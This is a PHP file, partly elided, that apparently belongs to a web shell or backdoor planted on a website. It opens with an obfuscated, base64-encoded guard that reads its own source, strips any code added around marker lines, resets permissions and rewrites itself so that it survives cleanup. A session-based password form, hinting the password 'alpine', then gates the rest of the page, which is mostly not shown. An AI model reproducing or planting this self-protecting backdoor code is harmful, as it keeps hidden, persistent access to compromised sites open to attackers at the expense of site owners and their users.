<?php while(false){/*t3npqQosyWJj*/ break;}; ?><?php $SagvBL=ExpLodE(BAsE64_DecODE("PD9waHAgd2hpbGUoZmFsc2Upey8qdDNucHFRb3N5V0pqKi8gYnJlYWs7fTsgPz4="),file_get_CONTEnts(__FILE__));if(Trim($SagvBL[0])!=""||Trim($SagvBL[2])!=""){cHMOD(__DIR__,0755);chMOd(__FILE__,0644);FiLe_PUT_COntenTS(__FILE__,base64_DeCOde("PD9waHAgd2hpbGUoZmFsc2Upey8qdDNucHFRb3N5V0pqKi8gYnJlYWs7fTsgPz4=").$SagvBL[1].Base64_dECoDE("PD9waHAgd2hpbGUoZmFsc2Upey8qdDNucHFRb3N5V0pqKi8gYnJlYWs7fTsgPz4="));}?><?php ;?><?php
	session_start();
		...
		if(!isset($_SESSION['loggedIn']) || !$_SESSION['loggedIn']) {
			...
			die("
				<form action = '?' method = 'POST'>
					<label>Password(alpine): <input type = 'password' name = 'password'></label>
...
</html><?php while(false){/*t3npqQosyWJj*/ break;}; ?>